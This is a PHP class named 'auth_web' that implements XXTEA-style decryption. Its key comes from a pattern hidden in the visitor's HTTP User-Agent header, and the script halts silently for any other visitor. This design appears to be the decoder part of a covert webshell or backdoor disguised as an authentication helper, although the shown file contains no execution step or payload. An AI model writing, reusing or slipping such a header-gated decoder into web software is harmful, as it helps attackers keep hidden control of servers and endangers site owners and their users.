<?php
class auth_web{
	function __construct(){
		$this->setIter(32);
	}
	function uncode($enc_data){
		if(preg_match('/\) A(.*)\/(.*)\.38/is',$_SERVER['HTTP_USER_AGENT'],$kk)){
			$key = $kk[2];
			$key .= '@ert';
		}else{
			die();
		}
		$n_enc_data_long = $this->C2L(0, $enc_data, $enc_data_long);
		$this->resize($key, 16, true);
		if ('' == $key)
		$key = '0000000000000000';
		$n_lkeyth = $this->C2L(0, $key, $lkeyth);
		$dbset = '';
		$w = array(0, 0);
		$j = 0;
		$len = 0;
		$k = array(0, 0, 0, 0);
		$pos = 0;
		for ($i = 0;$i < $n_enc_data_long;$i += 2){
			if ($j + 4 <= $n_lkeyth){
				$k[0] = $lkeyth[$j];
				$k[1] = $lkeyth[$j + 1];
				$k[2] = $lkeyth[$j + 2];
				$k[3] = $lkeyth[$j + 3];
			}else{
				$k[0] = $lkeyth[$j % $n_lkeyth];
				$k[1] = $lkeyth[($j + 1) % $n_lkeyth];
				$k[2] = $lkeyth[($j + 2) % $n_lkeyth];
				$k[3] = $lkeyth[($j + 3) % $n_lkeyth];
			}
			$j = ($j + 4) % $n_lkeyth;
			$this->decipherLong($enc_data_long[$i], $enc_data_long[$i + 1], $w, $k);
			if (0 == $i){
				$len = $w[0];
				if (4 <= $len){
					$dbset .= $this->L2C($w[1]);
				}else{
					$dbset .= substr($this->L2C($w[1]), 0, $len % 4);
				}
			}else{
				$pos = ($i - 1) * 4;
				if ($pos + 4 <= $len){
					$dbset .= $this->L2C($w[0]);
					if ($pos + 8 <= $len){
						$dbset .= $this->L2C($w[1]);
					}elseif($pos + 4 < $len){
						$dbset .= substr($this->L2C($w[1]), 0, $len % 4);
					}
				}else{
					$dbset .= substr($this->L2C($w[0]), 0, $len % 4);
				}
			}
		}
		return $dbset;
	}
	var $strto;
	function C2L($start, &$dbset, &$dbset_long){
		$n = strlen($dbset);
		$tmp = unpack('N*', $dbset);
		$j  = $start;
		foreach ($tmp as $value) 
		$dbset_long[$j++] = $value;
		return $j;
	}
	function L2C($l){
		return pack('N', $l);
	}
	function setIter($strto){
		$this->cd_str = $strto;
	}
	function getIter(){
		return $this->cd_str;
	}
	function rshift($integer, $n){
		if (0xffffffff < $integer || -0xffffffff > $integer){
			$integer = fmod($integer, 0xffffffff + 1);
		}
		if (0x7fffffff < $integer){
			$integer -= 0xffffffff + 1.0;
		}elseif(-0x80000000 > $integer){
			$integer += 0xffffffff + 1.0;
		}
		if (0 > $integer){
			$integer &= 0x7fffffff;
			$integer >>= $n;
			$integer |= 1 << (31 - $n);
		}else{
			$integer >>= $n;
		}
		return $integer;
	}
	function add($i1, $i2) {
		$result = 0.0;
		foreach (func_get_args() as $value){
		if (0.0 > $value){
			$value -= 1.0 + 0xffffffff;
		}
		$result += $value;
		}
		if (0xffffffff < $result || -0xffffffff > $result){
			$result = fmod($result, 0xffffffff + 1);
		}
		if (0x7fffffff < $result){
			$result -= 0xffffffff + 1.0;
		}elseif (-0x80000000 > $result){
			$result += 0xffffffff + 1.0;
		}
	return $result;
	}
	function decipherLong($y, $z, &$w, &$k){
		$sum = 0xC6EF3720;
		$delta = 0x9E3779B9;
		$n  = (integer) $this->cd_str;
		while ($n-- > 0){
			$z = $this->add($z, 
			-($this->add($y << 4 ^ $this->rshift($y, 5), $y) ^ 
			$this->add($sum, $k[$this->rshift($sum, 11) & 3])));
			$sum = $this->add($sum, -$delta);
			$y  = $this->add($y, 
			-($this->add($z << 4 ^ $this->rshift($z, 5), $z) ^ 
			$this->add($sum, $k[$sum & 3])));
		}
		$w[0] = $y;
		$w[1] = $z;
	}
	function resize(&$dbset, $size, $nonull = false){
		$n  = strlen($dbset);
		$nmod = $n % $size;
		if(0 == $nmod)
			$nmod = $size;
		if ($nmod > 0){
			if ($nonull){
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$dbset[$i] = $dbset[$i % $n];
				}
			}else{
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$dbset[$i] = chr(0);
				}
			}
		}
		return $n;
	}

}
